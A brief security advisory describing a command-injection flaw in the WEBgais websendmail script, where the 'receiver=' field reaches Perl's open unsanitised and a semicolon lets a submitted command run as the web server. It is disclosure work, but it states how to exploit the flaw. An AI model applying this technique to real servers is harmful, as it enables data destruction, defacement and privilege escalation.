WEBgais is a package that provides a web interface to the "gais" (Global Area Intelligent Search) search engine tool. This package contains a vulnerable script, websendmail, which can be used to execute arbitrary commands on the server with the privileges of the web server. User supplied data (from the "receiver=" form variable) is passed to a Perl OPEN function without proper input verification, allowing the use of shell metacharacters to separate commands. This can be directly exploited by submitting via the POST method the variable "receiver=" with the command separation shell metacharacter (;) followed by a command. Consequences could range from destruction of data and web site defacement to elevation of privileges through locally exploitable vulnerabilities.
